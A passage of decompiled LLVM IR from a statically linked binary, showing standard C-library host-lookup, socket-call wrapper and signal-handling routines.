dec_label_pc_1000a930:                            ; preds = %dec_label_pc_1000a924
  %v1_1000a930 = add i32 %v0_1000a924, -12
  store i32 %v1_1000a930, i32* %r0.global-to-local, align 4
  %v0_1000a934 = load i32, i32* @r30, align 4
  %v1_1000a934 = add i32 %v0_1000a934, 4
  store i32 %v1_1000a934, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1000a940 = inttoptr i32 %v1_1000a934 to i32*
  store i32 %v0_1000a934, i32* %v3_1000a940, align 4
  %v0_1000a944 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a944 = load i32, i32* %r25.global-to-local, align 4
  %v2_1000a944 = add i32 %v1_1000a944, 4
  %v3_1000a944 = inttoptr i32 %v2_1000a944 to i32*
  store i32 %v0_1000a944, i32* %v3_1000a944, align 4
  %tmp31 = icmp ult i32 %v1_1000a930, 32
  br i1 %tmp31, label %dec_label_pc_1000ab88, label %dec_label_pc_1000a94c

dec_label_pc_1000a94c:                            ; preds = %dec_label_pc_1000a930
  %v0_1000a94c = load i32, i32* @r29, align 4
  %v1_1000a94c = add i32 %v0_1000a94c, -44
  %tmp32 = icmp ult i32 %v1_1000a94c, 256
  br i1 %tmp32, label %dec_label_pc_1000ab88, label %dec_label_pc_1000a958

dec_label_pc_1000a958:                            ; preds = %dec_label_pc_1000a94c
  %v0_1000a958 = load i32, i32* @r30, align 4
  %v1_1000a958 = add i32 %v0_1000a958, 44
  store i32 %v1_1000a958, i32* @r31, align 4
  %v0_1000a95c = load i32, i32* @r23, align 4
  store i32 %v0_1000a95c, i32* @r4, align 4
  %v1_1000a964 = add i32 %v0_1000a958, 12
  store i32 %v1_1000a964, i32* %r21.global-to-local, align 4
  store i32 %v1_1000a958, i32* %r3.global-to-local, align 4
  store i32 268478832, i32* @lr, align 4
  %v3_1000a96c = call i32 @strncpy(i32 %v1_1000a958, i32 %v0_1000a95c, i32 %v1_1000a94c)
  %v0_1000a970 = load i32, i32* @r31, align 4
  %v1_1000a970 = load i32, i32* @r30, align 4
  %v2_1000a970 = add i32 %v1_1000a970, 12
  %v3_1000a970 = inttoptr i32 %v2_1000a970 to i32*
  store i32 %v0_1000a970, i32* %v3_1000a970, align 4
  %v0_1000a974 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a974 = load i32, i32* %r21.global-to-local, align 4
  %v2_1000a974 = add i32 %v1_1000a974, 4
  %v3_1000a974 = inttoptr i32 %v2_1000a974 to i32*
  store i32 %v0_1000a974, i32* %v3_1000a974, align 4
  %v0_1000a978 = load i32, i32* @r23, align 4
  store i32 %v0_1000a978, i32* %r3.global-to-local, align 4
  %v0_1000a97c = load i32, i32* @r30, align 4
  store i32 %v0_1000a97c, i32* @r4, align 4
  store i32 268478852, i32* @lr, align 4
  %v2_1000a980 = inttoptr i32 %v0_1000a978 to i8*
  %v3_1000a980 = call i32 @inet_aton(i8* %v2_1000a980)
  store i32 %v3_1000a980, i32* %r3.global-to-local, align 4
  store i32 %v3_1000a980, i32* %r22.global-to-local, align 4
  %v3_1000a984 = icmp eq i32 %v3_1000a980, 0
  br i1 %v3_1000a984, label %dec_label_pc_1000a9b8, label %dec_label_pc_1000a98c

dec_label_pc_1000a98c:                            ; preds = %dec_label_pc_1000a958
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000a994 = load i32, i32* @r26, align 4
  %v2_1000a994 = add i32 %v1_1000a994, 8
  %v3_1000a994 = inttoptr i32 %v2_1000a994 to i32*
  store i32 2, i32* %v3_1000a994, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000a99c = load i32, i32* @r31, align 4
  %v1_1000a99c = load i32, i32* @r26, align 4
  %v2_1000a99c = inttoptr i32 %v1_1000a99c to i32*
  store i32 %v0_1000a99c, i32* %v2_1000a99c, align 4
  %v0_1000a9a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000a9a0 = load i32, i32* @r26, align 4
  %v2_1000a9a0 = add i32 %v1_1000a9a0, 12
  %v3_1000a9a0 = inttoptr i32 %v2_1000a9a0 to i32*
  store i32 %v0_1000a9a0, i32* %v3_1000a9a0, align 4
  %v0_1000a9a4 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000a9a4 = load i32, i32* @r26, align 4
  %v2_1000a9a4 = add i32 %v1_1000a9a4, 16
  %v3_1000a9a4 = inttoptr i32 %v2_1000a9a4 to i32*
  store i32 %v0_1000a9a4, i32* %v3_1000a9a4, align 4
  %v0_1000a9a8 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000a9a8 = load i32, i32* @r26, align 4
  %v2_1000a9a8 = add i32 %v1_1000a9a8, 4
  %v3_1000a9a8 = inttoptr i32 %v2_1000a9a8 to i32*
  store i32 %v0_1000a9a8, i32* %v3_1000a9a8, align 4
  %v0_1000a9ac = load i32, i32* @r26, align 4
  %v1_1000a9ac = load i32, i32* @r20, align 4
  %v2_1000a9ac = inttoptr i32 %v1_1000a9ac to i32*
  store i32 %v0_1000a9ac, i32* %v2_1000a9ac, align 4
  %v0_1000a9b0 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000a9b0 = load i32, i32* @r24, align 4
  %v2_1000a9b0 = inttoptr i32 %v1_1000a9b0 to i32*
  store i32 %v0_1000a9b0, i32* %v2_1000a9b0, align 4
  br label %dec_label_pc_1000ab8c

dec_label_pc_1000a9b8:                            ; preds = %dec_label_pc_1000a958
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268478912, i32* @lr, align 4
  %v0_1000a9bc = call i32 @__open_nameservers()
  store i32 ptrtoint (i32* @global_var_100249a8.603 to i32), i32* %r29.global-to-local, align 4
  %v2_1000a9c4 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1000a9c4, i32* %r28.global-to-local, align 4
  store i32 %v2_1000a9c4, i32* @r3, align 4
  %v0_1000a9d8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_100249a8.603 to i32), i32* %r3.global-to-local, align 4
  %v0_1000a9e0 = call i32 @__pthread_return_0()
  %v3_1000a9e8 = load i32, i32* @global_var_10024a8c.604, align 4
  store i32 %v3_1000a9e8, i32* %r29.global-to-local, align 4
  store i32 %v2_1000a9c4, i32* @r3, align 4
  %v0_1000a9f4 = call i32 @__pthread_return_void()
  %v0_1000a9fc = load i32, i32* @r23, align 4
  store i32 %v0_1000a9fc, i32* %r3.global-to-local, align 4
  %v2_1000aa0c = ptrtoint i32* %stack_var_-120 to i32
  %v2_1000aa10 = ptrtoint i32* %stack_var_-100 to i32
  %v0_1000aa14 = load i32, i32* %r22.global-to-local, align 4
  store i32 268479012, i32* @lr, align 4
  %v6_1000aa20 = inttoptr i32 %v0_1000a9fc to i8*
  %v7_1000aa20 = call i32 @__dns_lookup(i8* %v6_1000aa20, i32 1, i32 %v3_1000a9e8, i32 ptrtoint (i32* @global_var_1002ad88.605 to i32), i32 %v2_1000aa0c, i32 %v2_1000aa10)
  store i32 %v7_1000aa20, i32* %r3.global-to-local, align 4
  %v1_1000aa24 = icmp slt i32 %v7_1000aa20, 0
  br i1 %v1_1000aa24, label %dec_label_pc_1000ab6c, label %dec_label_pc_1000aa2c

dec_label_pc_1000aa2c:                            ; preds = %dec_label_pc_1000a9b8
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1000aa34 = add i32 %tmp19, 4
  %v2_1000aa38 = mul i32 %v0_1000aa14, %v1_1000aa34
  %v1_1000aa3c = add i32 %v2_1000aa38, 256
  %v1_1000aa40 = load i32, i32* @r27, align 4
  %v3_1000aa40 = icmp ugt i32 %v1_1000aa3c, %v1_1000aa40
  br i1 %v3_1000aa40, label %dec_label_pc_1000aa48, label %dec_label_pc_1000aa64

dec_label_pc_1000aa48:                            ; preds = %dec_label_pc_1000aa2c
  %v3_1000aa48 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000aa48, i32* @r3, align 4
  store i32 268479056, i32* @lr, align 4
  %v0_1000aa4c = call i32 @free()
  %v3_1000aa50 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000aa50, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000aa58.606 to i32), i32* @lr, align 4
  %v0_1000aa54 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1000aa5c = load i32, i32* @r19, align 4
  %v1_1000aa5c = load i32, i32* @r24, align 4
  %v2_1000aa5c = inttoptr i32 %v1_1000aa5c to i32*
  store i32 %v0_1000aa5c, i32* %v2_1000aa5c, align 4
  br label %dec_label_pc_1000ab8c

dec_label_pc_1000aa64:                            ; preds = %dec_label_pc_1000aa2c
  %v3_1000aa64 = icmp eq i32 %v0_1000aa14, 0
  br i1 %v3_1000aa64, label %dec_label_pc_1000aa64.dec_label_pc_1000ab08_crit_edge, label %dec_label_pc_1000aa6c

dec_label_pc_1000aa64.dec_label_pc_1000ab08_crit_edge: ; preds = %dec_label_pc_1000aa64
  %v0_1000ab10.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ab08

dec_label_pc_1000aa6c:                            ; preds = %dec_label_pc_1000aa64
  %v2_1000aa6c = mul i32 %v0_1000aa14, %tmp19
  store i32 %v2_1000aa6c, i32* @r5, align 4
  %v0_1000aa70 = load i32, i32* @r30, align 4
  %v1_1000aa70 = add i32 %v0_1000aa70, 36
  store i32 %v1_1000aa70, i32* %r3.global-to-local, align 4
  %v0_1000aa74 = load i32, i32* @r31, align 4
  store i32 268479100, i32* @lr, align 4
  %v2_1000aa78 = call i32 @memmove(i32 %v1_1000aa70, i32 %v0_1000aa74)
  store i32 %v2_1000aa78, i32* %r3.global-to-local, align 4
  store i32 %v2_1000aa6c, i32* %r0.global-to-local, align 4
  %v0_1000aa88 = load i32, i32* @r30, align 4
  %v1_1000aa88 = load i32, i32* @r31, align 4
  %v3_1000aa88 = add i32 %v1_1000aa88, %v2_1000aa6c
  %v4_1000aa88 = inttoptr i32 %v3_1000aa88 to i32*
  store i32 %v0_1000aa88, i32* %v4_1000aa88, align 4
  %v0_1000aa8c = load i32, i32* @r31, align 4
  %v1_1000aa8c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000aa8c = add i32 %v1_1000aa8c, %v0_1000aa8c
  store i32 %v2_1000aa8c, i32* @r25, align 4
  %v1_1000aa94 = add i32 %v0_1000aa14, -1
  store i32 %v1_1000aa94, i32* %r11.global-to-local, align 4
  %v1_1000aa98 = add i32 %v0_1000aa14, 1
  %v2_1000aa9c = icmp sgt i32 %v1_1000aa94, -1
  store i32 %v1_1000aa98, i32* %ctr.global-to-local, align 4
  br i1 %v2_1000aa9c, label %dec_label_pc_1000aacc.preheader, label %dec_label_pc_1000aaa8

dec_label_pc_1000aaa8:                            ; preds = %dec_label_pc_1000aa6c
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000aacc.preheader

dec_label_pc_1000aacc.preheader:                  ; preds = %dec_label_pc_1000aaa8, %dec_label_pc_1000aa6c
  %v0_1000aad46 = phi i32 [ 1, %dec_label_pc_1000aaa8 ], [ %v1_1000aa98, %dec_label_pc_1000aa6c ]
  %v1_1000aacc3 = mul i32 %v1_1000aa94, 4
  store i32 %v1_1000aacc3, i32* %r0.global-to-local, align 4
  %v2_1000aad05 = add i32 %v2_1000aa8c, %v1_1000aacc3
  %v1_1000aad47 = add i32 %v0_1000aad46, -1
  store i32 %v1_1000aad47, i32* %ctr.global-to-local, align 4
  %v2_1000aad48 = icmp eq i32 %v1_1000aad47, 0
  br i1 %v2_1000aad48, label %dec_label_pc_1000aad8, label %dec_label_pc_1000aab4

dec_label_pc_1000aab4:                            ; preds = %dec_label_pc_1000aacc.preheader, %dec_label_pc_1000aab4.dec_label_pc_1000aab4_crit_edge
  %v1_1000aac8 = phi i32 [ %v2_1000aad0, %dec_label_pc_1000aab4.dec_label_pc_1000aab4_crit_edge ], [ %v2_1000aad05, %dec_label_pc_1000aacc.preheader ]
  %v0_1000aac0 = phi i32 [ %v0_1000aac0.pre, %dec_label_pc_1000aab4.dec_label_pc_1000aab4_crit_edge ], [ %v0_1000aa8c, %dec_label_pc_1000aacc.preheader ]
  %v0_1000aab8 = phi i32 [ %v0_1000aacc, %dec_label_pc_1000aab4.dec_label_pc_1000aab4_crit_edge ], [ %v1_1000aa94, %dec_label_pc_1000aacc.preheader ]
  %v2_1000aab8 = mul i32 %v0_1000aab8, %tmp19
  %v1_1000aabc = add i32 %v0_1000aab8, -1
  store i32 %v1_1000aabc, i32* %r11.global-to-local, align 4
  %v2_1000aac0 = add i32 %v0_1000aac0, -8
  %v1_1000aac4 = add i32 %v2_1000aac0, %v2_1000aab8
  %v2_1000aac8 = add i32 %v1_1000aac8, 4
  %v3_1000aac8 = inttoptr i32 %v2_1000aac8 to i32*
  store i32 %v1_1000aac4, i32* %v3_1000aac8, align 4
  %v0_1000aacc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000aacc = mul i32 %v0_1000aacc, 4
  store i32 %v1_1000aacc, i32* %r0.global-to-local, align 4
  %v1_1000aad0 = load i32, i32* @r25, align 4
  %v0_1000aad4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000aad4 = add i32 %v0_1000aad4, -1
  store i32 %v1_1000aad4, i32* %ctr.global-to-local, align 4
  %v2_1000aad4 = icmp eq i32 %v1_1000aad4, 0
  br i1 %v2_1000aad4, label %dec_label_pc_1000aad8, label %dec_label_pc_1000aab4.dec_label_pc_1000aab4_crit_edge

dec_label_pc_1000aab4.dec_label_pc_1000aab4_crit_edge: ; preds = %dec_label_pc_1000aab4
  %v2_1000aad0 = add i32 %v1_1000aad0, %v1_1000aacc
  %v0_1000aac0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000aab4

dec_label_pc_1000aad8:                            ; preds = %dec_label_pc_1000aab4, %dec_label_pc_1000aacc.preheader
  %v1_1000aae4 = phi i32 [ %v2_1000aa8c, %dec_label_pc_1000aacc.preheader ], [ %v1_1000aad0, %dec_label_pc_1000aab4 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000aae0 = mul i32 %v0_1000aa14, 4
  %v2_1000aae4 = add i32 %v1_1000aae0, 4
  %v2_1000aae8 = add i32 %v2_1000aae4, %v1_1000aae4
  %v3_1000aae8 = inttoptr i32 %v2_1000aae8 to i32*
  store i32 0, i32* %v3_1000aae8, align 4
  %v0_1000aaf4 = load i32, i32* @r25, align 4
  %v2_1000aaf4 = add i32 %v0_1000aaf4, %v1_1000aae0
  store i32 %v2_1000aaf4, i32* %r11.global-to-local, align 4
  %v1_1000aaf8 = load i32, i32* @r31, align 4
  %v2_1000aaf8 = sub i32 %v1_1000aaf8, %v2_1000aaf4
  %v1_1000aafc = add i32 %v2_1000aaf4, 8
  store i32 %v1_1000aafc, i32* @r31, align 4
  %v0_1000ab00 = load i32, i32* @r27, align 4
  %v2_1000ab00 = add i32 %v0_1000ab00, %v2_1000aaf8
  %v1_1000ab04 = add i32 %v2_1000ab00, -8
  br label %dec_label_pc_1000ab08

dec_label_pc_1000ab08:                            ; preds = %dec_label_pc_1000aa64.dec_label_pc_1000ab08_crit_edge, %dec_label_pc_1000aad8
  %v0_1000ab10 = phi i32 [ %v0_1000ab10.pre, %dec_label_pc_1000aa64.dec_label_pc_1000ab08_crit_edge ], [ %v1_1000aafc, %dec_label_pc_1000aad8 ]
  %v0_1000ab0c = phi i32 [ %v1_1000aa40, %dec_label_pc_1000aa64.dec_label_pc_1000ab08_crit_edge ], [ %v1_1000ab04, %dec_label_pc_1000aad8 ]
  %v3_1000ab08 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000ab08, i32* @r4, align 4
  store i32 %v0_1000ab10, i32* %r3.global-to-local, align 4
  store i32 268479256, i32* @lr, align 4
  %v3_1000ab14 = call i32 @strncpy(i32 %v0_1000ab10, i32 %v3_1000ab08, i32 %v0_1000ab0c)
  %v3_1000ab18 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000ab18, i32* @r3, align 4
  store i32 268479264, i32* @lr, align 4
  %v0_1000ab1c = call i32 @free()
  store i32 %v0_1000ab1c, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1000ab24 = icmp eq i32 %tmp18, 1
  br i1 %v3_1000ab24, label %dec_label_pc_1000ab2c, label %dec_label_pc_1000ab74

dec_label_pc_1000ab2c:                            ; preds = %dec_label_pc_1000ab08
  store i32 4, i32* @r5, align 4
  %v0_1000ab34 = load i32, i32* @r30, align 4
  store i32 %v0_1000ab34, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000ab3c.607 to i32), i32* @lr, align 4
  %v0_1000ab38 = call i32 @memcpy()
  %v1_1000ab40 = load i32, i32* @r26, align 4
  %v2_1000ab40 = add i32 %v1_1000ab40, 8
  %v3_1000ab40 = inttoptr i32 %v2_1000ab40 to i32*
  store i32 2, i32* %v3_1000ab40, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000ab48 = load i32, i32* @r26, align 4
  %v2_1000ab48 = add i32 %v1_1000ab48, 12
  %v3_1000ab48 = inttoptr i32 %v2_1000ab48 to i32*
  store i32 4, i32* %v3_1000ab48, align 4
  %v0_1000ab4c = load i32, i32* @r31, align 4
  %v1_1000ab4c = load i32, i32* @r26, align 4
  %v2_1000ab4c = inttoptr i32 %v1_1000ab4c to i32*
  store i32 %v0_1000ab4c, i32* %v2_1000ab4c, align 4
  %v0_1000ab50 = load i32, i32* @r25, align 4
  %v1_1000ab50 = load i32, i32* @r26, align 4
  %v2_1000ab50 = add i32 %v1_1000ab50, 16
  %v3_1000ab50 = inttoptr i32 %v2_1000ab50 to i32*
  store i32 %v0_1000ab50, i32* %v3_1000ab50, align 4
  %v0_1000ab54 = load i32, i32* @r21, align 4
  %v1_1000ab54 = load i32, i32* @r26, align 4
  %v2_1000ab54 = add i32 %v1_1000ab54, 4
  %v3_1000ab54 = inttoptr i32 %v2_1000ab54 to i32*
  store i32 %v0_1000ab54, i32* %v3_1000ab54, align 4
  %v3_1000ab58 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000ab58, i32* @r3, align 4
  store i32 268479328, i32* @lr, align 4
  %v0_1000ab5c = call i32 @free()
  store i32 %v0_1000ab5c, i32* %r3.global-to-local, align 4
  %v0_1000ab60 = load i32, i32* @r26, align 4
  %v1_1000ab60 = load i32, i32* @r20, align 4
  %v2_1000ab60 = inttoptr i32 %v1_1000ab60 to i32*
  store i32 %v0_1000ab60, i32* %v2_1000ab60, align 4
  br label %dec_label_pc_1000ab6c

dec_label_pc_1000ab6c:                            ; preds = %dec_label_pc_1000ab74, %dec_label_pc_1000a9b8, %dec_label_pc_1000ab2c
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000ab2c ], [ 2, %dec_label_pc_1000a9b8 ], [ 2, %dec_label_pc_1000ab74 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000ab2c ], [ 1, %dec_label_pc_1000a9b8 ], [ 1, %dec_label_pc_1000ab74 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1000ab6c = load i32, i32* @r24, align 4
  %v2_1000ab6c = inttoptr i32 %v1_1000ab6c to i32*
  store i32 %storemerge, i32* %v2_1000ab6c, align 4
  br label %dec_label_pc_1000ab8c

dec_label_pc_1000ab74:                            ; preds = %dec_label_pc_1000ab08
  %v3_1000ab74 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000ab74, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ab7c.608 to i32), i32* @lr, align 4
  %v0_1000ab78 = call i32 @free()
  store i32 %v0_1000ab78, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ab6c

dec_label_pc_1000ab88:                            ; preds = %dec_label_pc_1000a94c, %dec_label_pc_1000a930, %dec_label_pc_1000a924, %dec_label_pc_1000a914, %dec_label_pc_1000a904
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ab8c

dec_label_pc_1000ab8c:                            ; preds = %dec_label_pc_1000a8e8, %dec_label_pc_1000a8e0, %dec_label_pc_1000a894, %entry, %dec_label_pc_1000aa48, %dec_label_pc_1000a98c, %dec_label_pc_1000ab6c, %dec_label_pc_1000ab88
  store i32 %v0_1000a860, i32* %r0.global-to-local, align 4
  %v0_1000ab9c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ab9c

; uselistorder directives
  uselistorder i32 %v0_1000ab10, { 1, 0 }
  uselistorder i32 %v1_1000aae0, { 1, 0 }
  uselistorder i32 %v1_1000aad4, { 1, 0 }
  uselistorder i32 %v1_1000aacc, { 1, 0 }
  uselistorder i32 %v0_1000aab8, { 1, 0 }
  uselistorder i32 %v1_1000aacc3, { 1, 0 }
  uselistorder i32 %v1_1000aa94, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000aa8c, { 1, 0, 2 }
  uselistorder i32 %v0_1000aa14, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000a958, { 1, 0, 2 }
  uselistorder i32 %v0_1000a914.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1000a8fc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 19, 20, 21, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1 }
  uselistorder i32* %r0.global-to-local, { 18, 0, 1, 2, 3, 4, 19, 7, 5, 6, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_1000ab8c, { 7, 6, 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000ab6c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ab08, { 1, 0 }
  uselistorder label %dec_label_pc_1000aab4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a914, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000abb4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479428, i32* @lr, align 4
  %v2_1000abc0 = call i32 @__socketcall(i32 3, i32 %v2_1000abb4)
  ret i32 %v2_1000abc0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r5, align 4
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000abe8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479480, i32* @lr, align 4
  %v2_1000abf4 = call i32 @__socketcall(i32 6, i32 %v2_1000abe8)
  ret i32 %v2_1000abf4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ac1c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268479540, i32* @lr, align 4
  %v2_1000ac30 = call i32 @__socketcall(i32 15, i32 %v2_1000ac1c)
  ret i32 %v2_1000ac30

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ac58 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479596, i32* @lr, align 4
  %v2_1000ac68 = call i32 @__socketcall(i32 10, i32 %v2_1000ac58)
  ret i32 %v2_1000ac68

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ac90 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479652, i32* @lr, align 4
  %v2_1000aca0 = call i32 @__socketcall(i32 9, i32 %v2_1000ac90)
  ret i32 %v2_1000aca0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000acc8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268479716, i32* @lr, align 4
  %v2_1000ace0 = call i32 @__socketcall(i32 11, i32 %v2_1000acc8)
  ret i32 %v2_1000ace0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_1000ad08 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268479776, i32* @lr, align 4
  %v2_1000ad1c = call i32 @__socketcall(i32 14, i32 %v2_1000ad08)
  ret i32 %v2_1000ad1c

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000ad44 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268479828, i32* @lr, align 4
  %v2_1000ad50 = call i32 @__socketcall(i32 1, i32 %v2_1000ad44)
  ret i32 %v2_1000ad50

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 2, 1, 6, 0, 3, 5, 7, 4 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %arg1.off = add i32 %arg1, -1
  %tmp4 = icmp ult i32 %arg1.off, 64
  br i1 %tmp4, label %dec_label_pc_1000ad94, label %dec_label_pc_1000ad80

dec_label_pc_1000ad80:                            ; preds = %entry
  %v0_1000ad80 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000ad8c = inttoptr i32 %v0_1000ad80 to i32*
  store i32 22, i32* %v2_1000ad8c, align 4
  %v0_1000ada0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ad9c

dec_label_pc_1000ad94:                            ; preds = %entry
  %v0_1000ad94 = call i32 @__sigaddset()
  store i32 %v0_1000ad94, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ad9c

dec_label_pc_1000ad9c:                            ; preds = %dec_label_pc_1000ad80, %dec_label_pc_1000ad94
  %v0_1000ada0 = phi i32 [ %v0_1000ada0.pre, %dec_label_pc_1000ad80 ], [ %v0_1000ad94, %dec_label_pc_1000ad94 ]
  ret i32 %v0_1000ada0

; uselistorder directives
  uselistorder label %dec_label_pc_1000ad9c, { 1, 0 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268479944, i32* @lr, align 4
  %v3_1000adc4 = call i32 @__GI_memset(i32 0, i32 128, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1000addc = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1000addc, label %dec_label_pc_1000ae08, label %dec_label_pc_1000adf8

dec_label_pc_1000adf8:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_1000ae08, label %dec_label_pc_1000ae00

dec_label_pc_1000ae00:                            ; preds = %dec_label_pc_1000adf8
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_1000ae38.lr.ph, label %dec_label_pc_1000ae08

dec_label_pc_1000ae08:                            ; preds = %dec_label_pc_1000ae00, %dec_label_pc_1000adf8, %entry
  %v0_1000ae08 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_1000ae14 = inttoptr i32 %v0_1000ae08 to i32*
  store i32 22, i32* %v2_1000ae14, align 4
  %v0_1000aea8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000aea4

dec_label_pc_1000ae38.lr.ph:                      ; preds = %dec_label_pc_1000ae00
  %v2_1000ae28 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000ae28, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
